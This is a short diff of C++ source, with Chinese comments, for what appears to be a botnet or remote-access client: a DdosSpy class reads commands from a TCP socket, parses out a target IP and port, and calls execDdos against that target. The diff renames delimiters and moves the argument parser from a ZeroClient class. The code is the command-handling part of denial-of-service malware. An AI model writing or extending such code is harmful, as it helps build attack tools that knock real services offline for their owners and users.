@@ -91,28 +91,28 @@ void DdosSpy::addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int
 
     // 把数据转换成指令模式
     int endIndex;
-    while ((endIndex = buf.find(dSpy.CmdEnd)) >= 0) {
+    while ((endIndex = buf.find(dSpy.DdosEnd)) >= 0) {
         std::string line = buf.substr(0,endIndex);
-        buf.erase(0, endIndex+dSpy.CmdEnd.length());
+        buf.erase(0, endIndex+dSpy.DdosEnd.length());
 
         // 处理指令
-        std::map<std::string, std::string> ddosargs = parseArgs(line);
+        std::map<std::string, std::string> ddosargs = dSpy.parseArgs(line);
 
         execDdos(ddosargs["IP"].data(),atoi(ddosargs["PORT"].data()));
     }
 }
 
-std::map<std::string, std::string> ZeroClient::parseArgs(std::string &data)
+std::map<std::string, std::string> DdosSpy::parseArgs(std::string &data)
 {
     // 字符串分割成列表
     std::vector<std::string> v;
     std::string::size_type pos1, pos2;
-    pos2 = data.find(CmdSplit);
+    pos2 = data.find(DdosSplit);
     pos1 = 0;
     while(std::string::npos != pos2) {
         v.push_back(data.substr(pos1, pos2-pos1));
-        pos1 = pos2 + CmdSplit.size();
-        pos2 = data.find(CmdSplit, pos1);
+        pos1 = pos2 + DdosSplit.size();
+        pos2 = data.find(DdosSplit, pos1);
     }
     if(pos1 != data.length()) v.push_back(data.substr(pos1));
 
